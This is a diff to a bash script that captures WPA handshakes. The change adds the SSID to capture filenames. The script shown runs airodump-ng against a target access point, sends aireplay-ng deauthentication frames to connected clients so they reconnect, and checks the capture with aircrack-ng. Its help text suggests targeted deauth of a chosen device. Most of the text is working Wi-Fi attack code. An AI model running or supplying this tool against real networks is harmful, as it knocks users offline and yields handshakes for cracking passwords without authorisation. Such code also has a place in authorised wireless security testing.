@@ -169,9 +169,12 @@ if [[ -z "$BSSID" ]]; then
     green "   target: $BSSID ch $CH '$SSID'"
 fi
 
-echo "== Capturing handshake (${CAPSECS}s) -> $OUT/cap-<time>-01.cap"
+echo "== Capturing handshake (${CAPSECS}s) -> $OUT/<SSID>_cap-<time>-01.cap"
+SSID_TAG="$(printf '%s' "${SSID:-unknown}" | tr -cd 'A-Za-z0-9_.-' | cut -c1-20)"
+[[ -n "$SSID_TAG" ]] || SSID_TAG="unknown"
 page=$(date +%H%M%S)
-airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUT/cap-$page" "$MON_IF" >/dev/null 2>&1 &
+cap="${SSID_TAG}_cap-$page"
+airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUT/$cap" "$MON_IF" >/dev/null 2>&1 &
 DUMP_PID=$!
 sleep 4
 
@@ -189,7 +192,7 @@ for i in $(seq 1 $((CAPSECS/5))); do
                 [[ "$sl" == *"Station MAC"* ]] && { snd=1; continue; }
                 [[ $snd -eq 1 ]] || continue
                 [[ "$sl" =~ ^[0-9A-Fa-f:]{17} ]] && ST_MAC+=("$(cut -d, -f1 <<<"$sl" | tr -d ' ')")
-            done < "$OUT/cap-$page-01.csv"
+            done < "$OUT/${cap}-01.csv"
             if [[ ${#ST_MAC[@]} -gt 0 ]]; then
                 for SM in "${ST_MAC[@]}"; do
                     aireplay-ng -0 3 -a "$BSSID" -c "$SM" "$MON_IF" >/dev/null 2>&1 || true
@@ -202,7 +205,7 @@ for i in $(seq 1 $((CAPSECS/5))); do
         fi
     fi
     sleep 5
-    if aircrack-ng "$OUT/cap-$page-01.cap" 2>/dev/null | grep -q 'WPA ([1-9]'; then
+    if aircrack-ng "$OUT/${cap}-01.cap" 2>/dev/null | grep -q 'WPA ([1-9]'; then
         OK=1; yellow "   real handshake seen at ${i}x5s"; break
     fi
 done
@@ -210,10 +213,10 @@ kill "$DUMP_PID" 2>/dev/null; wait "$DUMP_PID" 2>/dev/null
 
 echo "== Result"
 if [[ $OK -eq 1 ]]; then
-    green "[+] HANDSHAKE CAPTURED: $OUT/cap-$page-01.cap"
-    aircrack-ng "$OUT/cap-$page-01.cap" | grep -E 'WPA \([1-9]' || true
+    green "[+] HANDSHAKE CAPTURED: $OUT/${cap}-01.cap"
+    aircrack-ng "$OUT/${cap}-01.cap" | grep -E 'WPA \([1-9]' || true
 else
-    red "[-] No handshake in ${CAPSECS}s (final check: $(aircrack-ng "$OUT/cap-$page-01.cap" 2>/dev/null | grep -c 'WPA ([1-9]') valid)."
+    red "[-] No handshake in ${CAPSECS}s (final check: $(aircrack-ng "$OUT/${cap}-01.cap" 2>/dev/null | grep -c 'WPA ([1-9]') valid)."
     yellow "    Causes: no client connected to AP, client farther than AP, or weak monitor RX."
     yellow "    -> connect a device (phone) to '$SSID' first, move closer, re-run:"
     yellow "    sudo $0 $IFACE '$SSID' 90"
@@ -221,6 +224,6 @@ else
         yellow "    Tip: pass the client MAC as arg 4 for a TARGETED deauth of that device."
     fi
     if command -v tshark >/dev/null; then
-        yellow "    EAPOL frames seen in capture: $(tshark -r "$OUT/cap-$page-01.cap" -Y eapol 2>/dev/null | wc -l)"
+        yellow "    EAPOL frames seen in capture: $(tshark -r "$OUT/${cap}-01.cap" -Y eapol 2>/dev/null | wc -l)"
     fi
 fi
